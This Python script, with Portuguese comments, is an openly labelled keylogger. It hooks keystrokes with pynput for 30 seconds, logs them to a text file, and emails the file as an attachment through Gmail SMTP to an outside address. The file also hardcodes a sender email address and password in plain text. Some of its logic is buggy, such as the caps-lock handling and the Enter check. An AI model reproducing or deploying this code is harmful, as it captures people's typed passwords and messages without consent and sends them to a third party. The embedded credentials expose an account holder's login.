from pynput import keyboard
from threading import Timer
import smtplib
from email.message import EmailMessage
import ctypes
import os


def get_capslock_state():
    hllDll = ctypes.WinDLL("User32.dll")
    VK_CAPITAL = 0x14
    return hllDll.GetKeyState(VK_CAPITAL)


# Trocar para C:\Windows\Temp\logs.json
def update_txt_file(key_list):
    with open(file_path, 'a') as file:
        print(key_list[-1])
        caps_lock_state = get_capslock_state()

        if key_list[-1] == 'Key.caps_lock':
            if caps_lock_state == 0:
                caps_lock_state == 1
            elif caps_lock_state == 1:
                caps_lock_state == 0
        elif (key_list[-1] == 'Key.space'):  # Troca Key.space por ' '
            file.write(' ')
        elif key_list[-1][
                0:
                3] == 'Key.enter':  # Caso especial para ficar claro o uso do Enter
            file.write('ENTER')
        elif key_list[-1][
                0:
                3] == 'Key':  # Ignora o restante das teclas que começam com Key
            do_nothing = 1
        else:  # Se for uma letra ou número, adiciona o caractere normalmente
            print('entrou no else')
            print('caps lock state: ', caps_lock_state)
            if caps_lock_state == 0:
                file.write(key_list[-1][1:2])
            elif caps_lock_state == 1:
                print('chegou aq')
                file.write(key_list[-1][1:2].upper())


def on_press(key):
    global x, key_list

    if x == False:
        key_list.append(f'{key}')
        if key_list[-1] == 'Key.backspace':
            with open(file_path, 'rb+') as file:
                file_size = os.path.getsize(file_path)
                if file_size > 0:
                    file.seek(-1, os.SEEK_END)
                    file.truncate()
        x = True

    update_txt_file(key_list)


def on_release(key):
    global x, key_list
    if x == True:
        x = False


def send_email(email, password, receiver, subject='(no subject)'):
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['To'] = receiver

    with open(file_path, "rb") as myfile:
        file_data = myfile.read()
        file_name = myfile.name
        msg.add_attachment(file_data,
                           maintype="application",
                           subtype='json',
                           filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(email, password)
        server.send_message(msg)

    print("Email sent!")


key_list = []
x = False  # Value to if held
file_path = 'logs.txt'
do_nothing = 1

print(
    "[+] Keylogger funcionando com sucesso!\n[!] Salvando dados no arquivo 'logs.json'"
)

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    Timer(30, listener.stop).start()
    listener.join()
    print("[-] Keylogger finalizado!")

send_email('mcpozebaiano@gmail.com', 'mcpozedorodo',
           'd.lima@aln.senaicimatec.edu.br', 'keylogger')
